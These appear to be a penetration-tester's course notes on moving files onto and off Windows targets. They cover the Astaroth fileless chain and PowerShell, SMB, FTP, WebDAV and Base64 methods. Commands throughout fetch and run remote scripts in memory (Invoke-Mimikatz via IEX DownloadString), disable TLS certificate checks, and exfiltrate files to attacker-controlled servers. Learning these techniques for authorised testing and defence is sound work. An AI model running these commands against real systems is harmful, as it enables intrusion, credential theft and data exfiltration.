# 02 — Windows File Transfer Methods (Download Operations)

## Overview

Windows has evolved with many built-in utilities for file transfers. Understanding these methods helps both **attackers** (operate and evade detection) and **defenders** (monitor and create policies). This section covers download operations — getting files **onto** a Windows target.

---

## Real-World Example: Astaroth Attack (Fileless Threat)

The Astaroth attack demonstrates how threat actors chain multiple file transfer methods to bypass defenses:

```
Step 1: Spear-phishing email → ZIP → LNK file → BAT command → WMIC
Step 2: WMIC downloads XSL file → hosts obfuscated JavaScript → runs WMIC again
Step 3: WMIC downloads another XSL file → JavaScript uses Bitsadmin, Certutil, Regsvr32
Step 4: Bitsadmin downloads encoded payloads
Step 5: Certutil decodes the downloaded payloads → DLL files
Step 6: Regsvr32 loads DLL → reflective DLL loading → process injection
Step 7: Userinit process hollowing → reflective DLL loading → Astaroth info-stealer
```

> **Key Insight:** "Fileless" doesn't mean no file transfer — it means the payload runs **in memory** rather than being written to disk. The transfers still happen.

### Tools Abused (All Built-in Windows Tools)

| Tool | Legitimate Purpose | Abused For |
|------|-------------------|------------|
| **WMIC** | Windows Management Instrumentation | Downloading XSL files with JavaScript |
| **Bitsadmin** | Background file transfers | Downloading encoded payloads |
| **Certutil** | Certificate management | Decoding Base64 payloads |
| **Regsvr32** | Register DLL files | Loading malicious DLLs |

---

## Method 1: PowerShell Base64 Encode & Decode

**Use Case:** Transfer files **without network communication** — encode on attack box, paste into target terminal.

### Step 1: Verify File Integrity (Attack Machine)

```bash
md5sum id_rsa
```
> Generates the MD5 hash of the file on your attack machine. Save this value to verify the file arrives intact on the target.

```
4e301756a07ded0a2dd6953abf015278  id_rsa
```

### Step 2: Encode to Base64 (Attack Machine)

```bash
cat id_rsa | base64 -w 0; echo
```
> Encodes the file as a base64 string without line wrapping (`-w 0`). The trailing `echo` adds a newline so the terminal prompt appears on a new line. Copy the entire output and paste it into the PowerShell command on the Windows target.

```
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K...
```

> `-w 0` = no line wrapping (outputs as one continuous string)

### Step 3: Decode on Windows Target

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K..."))
```
> Decodes the base64 string and writes the raw bytes directly to a file on the Windows target. Replace the base64 string with the actual output from the previous step. No network connection needed — the data was pasted into the terminal.

### Step 4: Confirm MD5 Hashes Match (Windows)

```powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```
> Computes the MD5 hash on the Windows target to verify the decoded file matches the source; swap the file path.

```
Algorithm       Hash                                    Path
---------       ----                                    ----
MD5             4E301756A07DED0A2DD6953ABF015278        C:\Users\Public\id_rsa
```

> ✅ Hashes match = successful transfer

### ⚠️ Limitations

- **cmd.exe** has a maximum string length of **8,191 characters**
- **Web shells** may error with extremely large strings
- Only practical for **small files**

---

## Method 2: PowerShell Web Downloads

**Why this works:** Most companies allow **HTTP/HTTPS outbound traffic** through the firewall for employee productivity.

### System.Net.WebClient Methods

Available in **all PowerShell versions**. Can download over HTTP, HTTPS, or FTP.

| Method | Description | Blocks Thread? |
|--------|-------------|---------------|
| `DownloadFile` | Downloads to a local file | ✅ Yes |
| `DownloadFileAsync` | Downloads to a local file | ❌ No |
| `DownloadString` | Downloads as a String | ✅ Yes |
| `DownloadStringAsync` | Downloads as a String | ❌ No |
| `DownloadData` | Downloads as Byte array | ✅ Yes |
| `DownloadDataAsync` | Downloads as Byte array | ❌ No |
| `OpenRead` | Returns data as a Stream | ✅ Yes |
| `OpenReadAsync` | Returns data as a Stream | ❌ No |

---

### DownloadFile Method

Downloads a file **to disk** on the target:

```powershell
# Synchronous (blocks until complete)
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

# Asynchronous (non-blocking)
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```
> Downloads a file to disk on the Windows target via WebClient (works in all PowerShell versions); swap the URL and destination path.

---

### DownloadString — Fileless Method (In-Memory Execution)

**Does NOT write to disk** — downloads and executes directly in memory using `Invoke-Expression` (alias: `IEX`):

```powershell
# Direct execution
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```
> Downloads a script into memory and executes it with no disk write (fileless); swap the URL for the script you want to run.

```powershell
# Pipeline input to IEX
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

> ⚠️ **Fileless = harder to detect.** No file on disk means traditional AV file scanning won't catch it.

---

### Invoke-WebRequest (PowerShell 3.0+)

Available from PowerShell 3.0 onwards. **Noticeably slower** than WebClient but simpler syntax:

```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
> Downloads a file to disk using the simpler Invoke-WebRequest cmdlet (PowerShell 3.0+); swap the URL and the -OutFile name.

**Aliases:** `iwr`, `curl`, `wget` (these are PowerShell aliases, NOT the Linux tools)

---

## Quick Reference: PowerShell Download Methods

| Method | Writes to Disk? | PowerShell Version | Speed | Best For |
|--------|----------------|-------------------|-------|----------|
| **Base64 Encode/Decode** | ✅ Yes | Any | N/A (no network) | Small files, no network needed |
| **WebClient.DownloadFile** | ✅ Yes | Any | Fast | Standard file downloads |
| **WebClient.DownloadString + IEX** | ❌ No (memory) | Any | Fast | Fileless execution |
| **Invoke-WebRequest** | ✅ Yes | 3.0+ | Slower | Simple syntax downloads |

---

---

## Common PowerShell Errors & Fixes

### Error 1: Internet Explorer First-Launch Configuration

```
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer
engine is not available, or Internet Explorer's first-launch configuration is not complete.
Specify the UseBasicParsing parameter and try again.
```

**Fix:** Add `-UseBasicParsing` parameter:

```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
> Same download piped to IEX with -UseBasicParsing to avoid the IE-engine error; swap the IP/URL.

### Error 2: SSL/TLS Certificate Not Trusted

```
Exception calling "DownloadString" with "1" argument(s): "The underlying connection was
closed: Could not establish trust relationship for the SSL/TLS secure channel."
```

**Fix:** Bypass certificate validation:

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
> Disables SSL/TLS certificate validation in the current PowerShell session so self-signed servers work; run before the download, no values to change.

---

## Method 3: SMB Downloads

**Port:** TCP/445 — very common in enterprise networks with Windows services.

### Setup: Create SMB Server (Attack Machine)

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```
> Spins up an SMB share named `share` serving a local directory so the Windows target can copy from it; change the share name and served path.

### Download File (Windows Target)

```cmd
C:\htb> copy \\192.168.220.133\share\nc.exe
```
> Copies a file from the attacker's SMB share to the current directory on the target; swap the attacker IP, share name, and filename.

### ⚠️ Unauthenticated Guest Access Blocked

Newer Windows versions block unauthenticated guest access:

```
You can't access this shared folder because your organization's security policies
block unauthenticated guest access.
```

**Fix:** Create SMB server with credentials:

```bash
# Attack machine — create authenticated SMB server
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
> Same SMB server but with credentials, required because newer Windows blocks guest access; change the username and password (and served path).

```cmd
:: Windows target — mount with credentials then copy
C:\htb> net use n: \\192.168.220.133\share /user:test test
C:\htb> copy n:\nc.exe
```
> Maps the authenticated SMB share to drive N: then copies a file from it; swap the attacker IP, share, credentials, and filename.

---

## Method 4: FTP Downloads

**Ports:** TCP/21 (control) and TCP/20 (data)

### Setup: Python FTP Server (Attack Machine)

```bash
# Install
sudo pip3 install pyftpdlib

# Start FTP server on port 21 (default is 2121)
# Anonymous authentication enabled by default
sudo python3 -m pyftpdlib --port 21
```
> Starts an anonymous read-only FTP server on port 21 on the attack machine; change the port if 21 is in use.

### Download via PowerShell

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```
> Downloads a file over FTP using PowerShell WebClient; swap the FTP URL/IP, remote filename, and destination path.

### Download via FTP Command File (Non-Interactive Shell)

When you don't have an interactive shell, create a command file:

```cmd
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
```

> **Tip:** The FTP command file method is critical when you only have a basic cmd shell — no interactive FTP prompts needed.

---

## Upload Operations

### Method 1: PowerShell Base64 Encode & Upload

**Reverse of the download method** — encode on Windows, decode on attack machine.

#### Step 1: Encode on Windows Target

```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```
> Reads a file on the Windows target and prints it as a base64 string to copy back to your attack machine; swap the file path.

```
IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCi...
```

#### Step 2: Get MD5 Hash on Windows

```powershell
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```
> Gets the MD5 hash of the source file on Windows so you can verify the upload after decoding; swap the file path.

```
Hash
----
3688374325B992DEF12793500307566D
```

#### Step 3: Decode on Attack Machine

```bash
echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCi... | base64 -d > hosts
md5sum hosts
```
> Decodes the pasted base64 back into a file on your attack machine and hashes it to confirm it matches; replace the base64 string and output filename.

```
3688374325b992def12793500307566d  hosts
```

> ✅ Hashes match = successful upload

---

### Method 2: PowerShell Web Uploads

PowerShell has **no built-in upload function**, but we can use `Invoke-WebRequest` or `Invoke-RestMethod` with a web server that accepts uploads.

#### Setup: Python Upload Server (Attack Machine)

```bash
pip3 install uploadserver
python3 -m uploadserver
```
> Installs and starts the Python upload server (default port 8000) to receive files exfiltrated from Windows; pass a port to change it.

```
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### Upload Using PSUpload.ps1

```powershell
# Download the upload script (fileless)
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

# Upload the file
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```
> Loads PSUpload.ps1 filelessly then uploads a file from the Windows target to your upload server; swap the Uri/IP and the -File path.

```
[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```

#### PowerShell Base64 Web Upload (via Netcat)

```powershell
# Windows: Encode and POST
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
> Base64-encodes a file and POSTs it to a Netcat listener for exfiltration; swap the file path and the listener URL/IP.

```bash
# Attack machine: Catch with Netcat and decode
nc -lvnp 8000
# Copy the base64 body from the POST request, then:
echo <base64> | base64 -d -w 0 > hosts
```
> Listens for the POSTed base64 then decodes it back into the file; change the port and replace `<base64>` with the captured body / output filename.

---

### Method 3: SMB Uploads (WebDAV)

**Problem:** Enterprises often block SMB (TCP/445) leaving the internal network.

**Solution:** Run SMB over HTTP using **WebDAV** (RFC 4918) — extends HTTP so a web server behaves like a file server.

> **How it works:** Windows Shell tries SMB first → if no SMB share found → falls back to HTTP (WebDAV)

#### Setup: WebDAV Server (Attack Machine)

```bash
# Install
sudo pip3 install wsgidav cheroot

# Start WebDAV server
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```
> Runs an anonymous WebDAV server (SMB-over-HTTP) so Windows can reach it when port 445 is blocked outbound; change the port and --root directory.

#### Browse the WebDAV Share (Windows Target)

```cmd
C:\htb> dir \\192.168.49.128\DavWWWRoot
```

> **Note:** `DavWWWRoot` is a special Windows Shell keyword — tells the Mini-Redirector driver you're connecting to the WebDAV root. No such folder actually exists on the server. You can also use a real folder: `\\192.168.49.128\sharefolder`

#### Upload Files via WebDAV

```cmd
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

> **Tip:** If SMB (TCP/445) is not restricted, use `impacket-smbserver` instead — simpler setup.

---

### Method 4: FTP Uploads

Same as FTP downloads, but start the server with `--write` to allow uploads.

#### Setup: FTP Server with Write Access (Attack Machine)

```bash
sudo python3 -m pyftpdlib --port 21 --write
```
> Starts an FTP server with write enabled so the target can upload files to you; change the port if 21 is busy.

#### Upload via PowerShell

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
> Uploads a file from the Windows target to the FTP server via WebClient; swap the FTP URL/IP, remote name, and local file path.

#### Upload via FTP Command File (Non-Interactive Shell)

```cmd
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
```
> Builds a scripted FTP command file then runs it to PUT/upload a file from a non-interactive shell; swap the server IP and the local file path.

---

## Complete Quick Reference

### Download Methods

| Method | Port | Writes to Disk? | Requires | Best For |
|--------|------|----------------|----------|----------|
| **Base64 Encode/Decode** | None | ✅ Yes | Terminal access | Small files, no network |
| **PowerShell WebClient** | 80/443 | ✅ Yes | PowerShell | Standard file downloads |
| **PowerShell IEX** | 80/443 | ❌ No (memory) | PowerShell | Fileless execution |
| **Invoke-WebRequest** | 80/443 | ✅ Yes | PowerShell 3.0+ | Simple syntax |
| **SMB (Impacket)** | 445 | ✅ Yes | SMB allowed | Enterprise networks |
| **FTP** | 21 | ✅ Yes | FTP client | When HTTP blocked |

### Upload Methods

| Method | Port | Setup Required | Best For |
|--------|------|---------------|----------|
| **Base64 Encode → Paste** | None | None | Small files, no network |
| **PSUpload.ps1** | 8000 | `uploadserver` | Easy PowerShell upload |
| **Base64 POST → Netcat** | Any | `nc -lvnp` | Quick exfiltration |
| **WebDAV** | 80 | `wsgidav` | When SMB blocked outbound |
| **SMB (Impacket)** | 445 | `impacket-smbserver` | When SMB allowed |
| **FTP** | 21 | `pyftpdlib --write` | When HTTP blocked |

---

## Key Takeaways

- **Astaroth attack** demonstrates real-world chaining of built-in Windows transfer tools (WMIC, Bitsadmin, Certutil, Regsvr32)
- **"Fileless"** doesn't mean no transfer — it means execution happens **in memory**
- **Base64 method** works without network but is limited by string length (8,191 chars in cmd.exe)
- **Always verify transfers** with hash comparison (`md5sum` on Linux, `Get-FileHash` on Windows)
- **PowerShell WebClient** is available in all versions and is faster than `Invoke-WebRequest`
- **IEX + DownloadString** = fileless execution — downloads and runs in memory without touching disk
- **SMB guest access** is blocked on newer Windows — use `-user` and `-password` with `impacket-smbserver`
- **WebDAV** is the fallback when SMB (445) is blocked outbound — runs SMB over HTTP (80)
- **FTP command files** are essential for non-interactive shells — no user prompts needed
- **`DavWWWRoot`** is a Windows Shell keyword, not a real folder
- `Invoke-WebRequest` aliases (`iwr`, `curl`, `wget`) are **PowerShell aliases**, not the Linux tools
- For uploads: PowerShell has no built-in upload — use `uploadserver`, WebDAV, FTP, or Base64+Netcat

---

## 🔥 Attack Chain: Upload File to Windows Target via RDP

Real-world workflow for getting a file onto a Windows target when you have RDP credentials.

### Scenario

You have RDP creds and need to upload a tool/payload (e.g., `payload.zip`) to the target.

### Chain: Try Methods Until One Works

```
┌──────────────────────────────────────────────────────────────────┐
│  STEP 1: Start file server on YOUR attack machine               │
│          Try each method until one gets through                  │
└──────────────────────────────────────────────────────────────────┘
                              │
         ┌────────────────────┼────────────────────┐
         ▼                    ▼                    ▼
   ┌──────────┐        ┌──────────┐         ┌──────────┐
   │  HTTP     │        │  SMB     │         │  FTP     │
   │  Port 80  │        │  Port 445│         │  Port 21 │
   │  /8080    │        │          │         │          │
   └──────────┘        └──────────┘         └──────────┘

         │                    │                    │
         ▼                    ▼                    ▼
   PowerShell            copy \\IP\             FTP client
   WebClient             share\file             or PowerShell
   or IWR                                       WebClient
```

---

### Method A: HTTP (Most Common — Try First)

**Attack Machine:**
```bash
# Navigate to folder with your file
cd /path/to/payload/
python3 -m http.server 8080
```
> Serves the payload folder over HTTP on port 8080; swap the directory path and change 8080 if it's in use.

**RDP into target, open PowerShell:**
```bash
xfreerdp /v:<TARGET_IP> /u:<USER> /p:'<PASS>' /dynamic-resolution /compression /bpp:8 /network:modem -wallpaper -themes -aero
```
> Opens an RDP session to the Windows target with low-bandwidth tuning; replace the target IP, username, and password.

**On Windows target (PowerShell):**
```powershell
# Download
(New-Object Net.WebClient).DownloadFile('http://<YOUR_IP>:8080/payload.zip','C:\Users\Public\payload.zip')

# Unzip
Expand-Archive -Path C:\Users\Public\payload.zip -DestinationPath C:\Users\Public\payload

# Execute
cd C:\Users\Public\payload
.\tool.exe
```

> ❌ **If HTTP blocked** → Try Method B

---

### Method B: SMB (When HTTP Fails)

**Attack Machine:**
```bash
# Without auth
sudo impacket-smbserver share -smb2support /path/to/payload/

# With auth (if guest access blocked)
sudo impacket-smbserver share -smb2support /path/to/payload/ -user test -password test
```
> Starts an SMB share (anonymous or authenticated) serving the payload folder; swap the served path and, for auth, the username/password.

**On Windows target (cmd or PowerShell):**
```cmd
:: Without auth
copy \\<YOUR_IP>\share\payload.zip C:\Users\Public\payload.zip

:: With auth
net use n: \\<YOUR_IP>\share /user:test test
copy n:\payload.zip C:\Users\Public\payload.zip
```

> ❌ **If SMB blocked** → Try Method C

---

### Method C: FTP (When HTTP + SMB Fail)

**Attack Machine:**
```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```
> Installs and starts an anonymous FTP server on port 21 in the payload directory; change the port if 21 is busy.

**On Windows target (PowerShell):**
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://<YOUR_IP>/payload.zip', 'C:\Users\Public\payload.zip')
```

> ❌ **If FTP blocked** → Try Method D

---

### Method D: Base64 (When ALL Network Transfers Blocked)

**Attack Machine:**
```bash
cat payload.zip | base64 -w 0; echo
# Copy the entire output
```
> Encodes the payload as a single base64 string to paste into the target when all network transfers are blocked; swap the filename.

**On Windows target (PowerShell):**
```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\payload.zip", [Convert]::FromBase64String("<PASTE_BASE64_HERE>"))
```

> ⚠️ Only works for small files (< 8,191 chars in cmd.exe)

---

### Method E: WebDAV (When SMB Blocked Outbound But HTTP Allowed)

**Attack Machine:**
```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/path/to/payload/ --auth=anonymous
```

**On Windows target (cmd):**
```cmd
copy \\<YOUR_IP>\DavWWWRoot\payload.zip C:\Users\Public\payload.zip
```

---

### RDP Performance Tips (Reduce Lag)

```bash
# Low-bandwidth optimized RDP
xfreerdp /v:<IP> /u:<USER> /p:'<PASS>' /w:1024 /h:768 /bpp:8 /compression /network:modem -wallpaper -themes -aero

# Or skip RDP entirely — use command line only
evil-winrm -i <IP> -u <USER> -p '<PASS>'
```

---

### Decision Flowchart

```
Need to upload file to Windows target?
│
├── Do you have RDP creds?
│   ├── YES → RDP in + use PowerShell to download from your server
│   └── NO  → Do you have a shell?
│             ├── YES → Use PowerShell/cmd transfer methods
│             └── NO  → Need initial access first
│
├── Which port is open outbound from target?
│   ├── HTTP (80/443/8080) → python3 -m http.server + PowerShell WebClient
│   ├── SMB (445)          → impacket-smbserver + copy/net use
│   ├── FTP (21)           → pyftpdlib + FTP client/PowerShell
│   ├── None               → Base64 encode/decode (small files only)
│   └── HTTP but not SMB   → WebDAV (wsgidav) for SMB-over-HTTP
│
└── Always verify: Get-FileHash <file> -Algorithm MD5
```

---

## Module Questions & Answers

*Add exercise answers here as you complete them*
